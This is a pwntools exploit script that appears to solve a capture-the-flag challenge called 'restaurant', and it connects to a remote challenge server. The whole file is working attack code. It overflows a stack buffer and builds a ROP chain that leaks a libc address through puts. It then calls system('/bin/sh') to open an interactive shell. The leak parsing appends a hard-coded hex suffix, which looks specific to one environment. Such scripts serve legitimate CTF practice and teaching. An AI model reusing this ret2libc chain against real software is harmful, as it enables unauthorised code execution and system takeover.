from pwn import *

gs = '''
break *fill+136
continue
'''

elf = context.binary = ELF("./restaurant_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("83.136.249.50", 34632)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

offset = 40

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = b"".join([
    b"A"*offset,
    p64(pop_rdi),
    p64(elf.got.puts),
    p64(elf.plt.puts),
    p64(elf.sym.main)
])

io.sendlineafter("> ", b"1")

io.sendlineafter("> ", payload)

io.recvline()
io.recvline()

leak_address = int(hex(u64(io.recvline().strip().ljust(8, b"\x00"))) + "c760", 16) # _IO_new_file_fopen + 480

#print(f"[+] {leak_address}")

libc.address = (leak_address - 480) - libc.sym._IO_new_file_fopen

print(f"[+] system: {hex(libc.sym.system)}")

payload = b"".join([
    b"A"*offset,
    p64(pop_rdi),
    p64(next(libc.search(b'/bin/sh\x00'))),
    p64(ret),
    p64(libc.sym.system)
])

io.sendlineafter("> ", b"1")
io.sendlineafter("> ", payload)

io.interactive()
